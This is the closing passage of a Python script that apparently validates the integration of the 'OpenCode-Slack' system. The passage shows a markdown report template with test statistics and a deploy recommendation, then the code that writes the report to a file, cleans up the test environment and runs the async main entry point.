- **Total Validation Time:** {total_time:.2f} seconds
- **Tests Executed:** {len(validation_results)}
- **Tests Passed:** {sum(validation_results.values())}
- **Tests Failed:** {len(validation_results) - sum(validation_results.values())}
- **Success Rate:** {overall_success_rate:.1f}%

### System Performance During Testing
- **Peak Memory Usage:** {self.results.get('production_readiness', {}).get('resource_usage', {}).get('memory_mb', 'N/A')}MB
- **CPU Utilization:** {self.results.get('production_readiness', {}).get('resource_usage', {}).get('cpu_percent', 'N/A')}%
- **Concurrent Request Handling:** {self.results.get('production_readiness', {}).get('scalability', {}).get('success_rate', 'N/A')}%

---

## 🎉 Conclusion

The final comprehensive system integration validation has been completed. The OpenCode-Slack system {'demonstrates excellent integration of all fixes and optimizations, achieving production readiness with outstanding performance and reliability' if overall_success_rate >= 85 else 'requires additional work to achieve full production readiness'}.

**Final Recommendation:** {'✅ DEPLOY TO PRODUCTION' if overall_success_rate >= 85 else '⚠️ ADDRESS ISSUES BEFORE DEPLOYMENT'}

---

*Report generated by OpenCode-Slack Final System Integration Validator*  
*Validation completed: {datetime.now().strftime("%B %d, %Y at %H:%M:%S")}*
"""

        # Write report to file
        with open(report_filename, 'w') as f:
            f.write(report_content)
        
        logger.info(f"📊 Final validation report saved to: {report_filename}")
    
    async def cleanup(self):
        """Clean up test environment"""
        logger.info("🧹 Cleaning up test environment...")
        
        try:
            if self.session:
                await self.session.close()
            
            if self.server_process:
                self.server_process.terminate()
                self.server_process.wait(timeout=10)
            
            logger.info("✅ Cleanup completed")
            
        except Exception as e:
            logger.warning(f"⚠️ Cleanup warning: {e}")

async def main():
    """Main execution function"""
    validator = FinalSystemIntegrationValidator()
    
    try:
        success = await validator.run_comprehensive_validation()
        
        if success:
            print("\n🎉 FINAL VALIDATION SUCCESSFUL - SYSTEM IS PRODUCTION READY!")
            sys.exit(0)
        else:
            print("\n⚠️ FINAL VALIDATION INCOMPLETE - SYSTEM NEEDS IMPROVEMENTS")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\n⏹️ Validation interrupted by user")
        await validator.cleanup()
        sys.exit(1)
    except Exception as e:
        print(f"\n💥 Validation failed with error: {e}")
        await validator.cleanup()
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())